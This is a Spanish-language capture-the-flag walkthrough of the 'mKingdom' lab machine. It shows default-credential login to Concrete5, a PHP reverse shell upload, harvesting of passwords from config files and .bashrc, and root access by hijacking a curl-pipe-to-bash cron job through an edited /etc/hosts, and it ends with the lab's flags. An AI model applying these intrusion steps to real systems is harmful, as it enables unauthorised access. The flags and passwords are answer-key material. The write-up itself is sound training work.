---
title: mKingdom
tags: [CTF, Cibersecurity]
date: 2024-10-27
image: "../assets/mKingdom.png"
---

# CTF — mKingdom 

---

## 1. Reconocimiento — Escaneo de Puertos

Usamos nmap para escanear los puertos:

```bash
$ nmap 10.10.29.130

PORT   STATE SERVICE
85/tcp open  mit-ml-dev
```

Vemos que es un puerto HTTP, por lo tanto tiene página web la cual podemos ingresar:

```
http://10.10.29.130:85
```

![Página principal](https://i.imgur.com/E20iKT2.png)

Vemos una página con el siguiente mensaje: *"Bwa, ha, ha, pathetic, you'll never learn!"*. Al inspeccionar no vamos a encontrar nada útil, por lo tanto recurrimos a revisar los directorios de esta.

---

## 2. Enumeración de Directorios — Gobuster

```bash
$ gobuster dir -u http://10.10.33.212:85/ -w Downloads/common.txt

Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 283]
/.htaccess            (Status: 403) [Size: 288]
/.htpasswd            (Status: 403) [Size: 288]
/app                  (Status: 301) [Size: 312] [--> http://10.10.33.212:85/app/]
/index.html           (Status: 200) [Size: 647]
/server-status        (Status: 403) [Size: 292]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
```

Vemos una página llamada `/app` la cual es interesante. Al ingresar vemos un botón el cual nos dirige a un blog llamado **"Toad's Website"**.

![Toad's Website](https://i.imgur.com/sxgRxp3.png)

Después de investigar la página encontramos un login en la parte inferior. En este login podemos hacer fuerza bruta. Probamos credenciales comunes:

- **Username:** `Admin`
- **Password:** `password`

**¡Funcionó!**

---

## 3. Acceso Inicial — Reverse Shell

Ya adentro, miramos la versión de **Concrete5** e intentamos hacer un **reverse shell**.

En la página había un apartado `Files` donde podíamos subir el archivo, pero antes se necesitaba habilitar la subida de la extensión PHP en:

```
Systems and Settings → Allowed File Types
```

Luego de hacer esto, subimos la reverse shell e ingresamos al servidor:

```bash
$ whoami
www-data

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1003(web)

$ uname -a
Linux mkingdom.thm 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

---

## 4. Escalada — Usuario `toad`

Revisamos el directorio `/home/`:

```bash
$ ls -la /home/
total 16
drwxr-xr-x  4 root  root  4096 Jun  9  2023 .
drwxr-xr-x 23 root  root  4096 Jun  7  2023 ..
drwx------ 15 mario mario 4096 Jan 29  2024 mario
drwxrwx--- 16 toad  toad  4096 Jan 29  2024 toad
```

No tenemos acceso a estas carpetas. Vamos a la carpeta de `www-data`, es decir `/var/www/html`, y buscamos credenciales de `toad`:

```bash
$ grep -r "toad"
./application/config/generated_overrides/site.php:            'name' => 'toad',
./application/config/database.php:            'username' => 'toad',
./application/config/database.php:            'password' => 'toadisthebest',
...
```

Confirmamos las credenciales en el archivo de configuración:

```php
<?php

return [
    'default-connection' => 'concrete',
    'connections' => [
        'concrete' => [
            'driver' => 'c5_pdo_mysql',
            'server' => 'localhost',
            'database' => 'mKingdom',
            'username' => 'toad',
            'password' => 'toadisthebest',
            'character_set' => 'utf8',
            'collation' => 'utf8_unicode_ci',
        ],
    ],
];
```

Accedemos a la base de datos MySQL:

```bash
$ mysql -h localhost -u toad -p mKingdom
Enter password: toadisthebest
```

Pero al mirar, **no se encuentra nada útil**.

**Al probar las credenciales de `toad` para `su`, ¡entra!**

> Para usar `su`, abre una shell con Python:
> ```bash
> export TERM=linux
> python -c "import pty; pty.spawn('/bin/bash')"
> ```

Al ver los archivos de `toad` encontramos varios interesantes pero sin ningún valor:

```
cat smb.txt

Save them all Mario!

                                      \| /
                    ....'''.           |/
             .''''''        '.       \ |
             '.     ..     ..''''.    \| /
              '...''  '..''     .'     |/
     .sSSs.             '..   ..'    \ |
    .P'  `Y.               '''        \| /
    SS    SS                           |/
    SS    SS                           |
    SS  .sSSs.                       .===.
    SS .P'  `Y.                      | ? |
    SS SS    SS                      `==='
    SS ""    SS
    P.sSSs.  SS
    .P'  `Y. SS
    SS    SS SS                 .===..===..===..===.
    SS    SS SS                 |   || ? ||   ||   |
    ""    SS SS            .===.`==='`==='`==='`==='
  .sSSs.  SS SS            |   |
 .P'  `Y. SS SS       .===.`==='
 SS    SS SS SS       |   |
 SS    SS SS SS       `==='
SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
```

---

## 5. Escalada — Usuario `mario`

En `.bashrc` se encuentra un token en Base64:

```bash
export PWD_token='aWthVGVOVEFOdEVTCg=='
```

Al decodificar:

```
ikaTeNTANtES
```

**Esta es la clave de `mario`.**

---

## 6. Flag de Usuario

Ya dentro como `mario`, vemos que `cat` no funciona:

```bash
mario@mkingdom:~$ cat user.txt
cat: user.txt: Permission denied
```

Es un poco raro porque el archivo es legible para cualquiera:

```bash
-rw-r--r-- 1 root  root    38 Nov 27  2023 user.txt
```

Nos damos cuenta que `cat` tiene SUID del usuario `toad`:

```bash
mario@mkingdom:~$ ls -l /bin/cat
-rwsr-xr-x 1 toad root 47904 Mar 10  2016 /bin/cat
```

Usamos otro comando para acceder a la bandera:

```bash
mario@mkingdom:~$ head user.txt
thm{030a769febb1b3291da1375234b84283}
```

---

## 7. Escalada a Root — Cron Job Hijacking

Al probar `sudo -l`, vemos que el usuario `mario` puede correr `id` como root, pero no se puede hacer nada con `id`.

Exploramos `/var/log` y encontramos `up.log`:

```bash
mario@mkingdom:/var/log$ cat up.log
There are 39842 folder and files in TheCastleApp in - - - - > Fri Oct  4 16:11:02 EDT 2024.
There are 39842 folder and files in TheCastleApp in - - - - > Fri Oct  4 16:12:01 EDT 2024.
There are 39842 folder and files in TheCastleApp in - - - - > Fri Oct  4 16:13:01 EDT 2024.
There are 39842 folder and files in TheCastleApp in - - - - > Fri Oct  4 16:14:02 EDT 2024.
```

Esto parece ser un **cron** ya que se actualiza regularmente. Usamos [pspy](https://github.com/DominicBreuker/pspy) para verificar los procesos:

**Pasos para subir pspy64 a la máquina:**
1. Descargar `pspy64` en nuestra máquina local.
2. Levantar un servidor HTTP: `python3 -m http.server 80`
3. Descargar desde la máquina objetivo: `wget http://10.6.12.70:85/pspy64`
4. Dar permisos y ejecutar.

Al ejecutarlo, confirmamos la existencia del cron:

```bash
/bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log
```

Lo que hace es ejecutar `counter.sh` buscándolo desde el servidor `mkingdom.thm`. Podemos hacer **spoofing** de esto, ya que `/etc/hosts` puede ser modificado por el grupo `mario`:

```bash
-rw-rw-r-- 1 root mario 343 Oct  4 18:29 /etc/hosts
```

### Explotación

1. Modificar `/etc/hosts` para apuntar `mkingdom.thm` a nuestra máquina.
2. Crear los directorios necesarios y el archivo `counter.sh` con un script de **reverse shell**.
3. Levantar un servidor HTTP en el puerto 80.

El cron irá a nuestra máquina pensando que es el servidor local, descargará `counter.sh` y lo ejecutará. Como el cron corre como **root**, obtendremos una **root shell**.

---

## 8. Flag de Root

```bash
# head root.txt
thm{e8b2f52d88b9930503cc16ef48775df0}
```

---

## Resumen de Flags

| Flag | Hash |
|------|------|
| **user.txt** | `thm{030a769febb1b3291da1375234b84283}` |
| **root.txt** | `thm{e8b2f52d88b9930503cc16ef48775df0}` |